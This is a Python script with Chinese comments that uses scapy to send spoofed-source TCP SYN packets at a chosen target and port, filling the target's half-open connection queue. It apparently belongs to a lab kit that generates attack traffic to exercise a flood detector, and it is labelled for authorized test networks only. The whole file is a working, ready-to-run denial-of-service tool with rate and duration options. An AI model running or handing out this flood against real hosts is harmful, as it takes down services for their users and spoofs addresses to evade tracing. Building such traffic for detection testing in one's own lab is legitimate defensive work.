"""SYN 洪泛复现（**仅限本人授权实验网段**）。

用伪造源地址发送 SYN，模拟半连接队列被打满的情形。源地址用目标网段内随机地址，
这样探针看到的是"大量不同源、每条流只有 1 个 SYN 包"——正是 SYN 洪泛的典型形态。
"""

from __future__ import annotations

import argparse
import random
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from attack.common import add_common_args, guard, pace, require_root  # noqa: E402


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description="SYN 洪泛（仅限授权实验网段）")
    add_common_args(ap)
    ap.add_argument("--spoof-prefix", default=None,
                    help="伪造源地址前缀，如 10.0.0.（默认沿用目标所在 /24）")
    args = ap.parse_args(argv)
    guard(ap, args)
    require_root()

    from scapy.all import IP, TCP, send

    prefix = args.spoof_prefix or args.target.rsplit(".", 1)[0] + "."
    rng = random.Random(42)
    started = time.monotonic()
    sent = 0
    print(f"[SYN] -> {args.target}:{args.port}　伪造源 {prefix}x，速率 {args.rate}/s", flush=True)
    while time.monotonic() - started < args.duration:
        sport = rng.randint(1024, 65535)
        pkt = IP(src=f"{prefix}{rng.randint(2, 254)}", dst=args.target) / \
              TCP(sport=sport, dport=args.port, flags="S", seq=rng.randint(0, 2**32 - 1))
        send(pkt, verbose=False)
        sent += 1
        pace(args.rate, sent, started)
    print(f"[SYN] 完成，共发出 {sent} 个 SYN", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
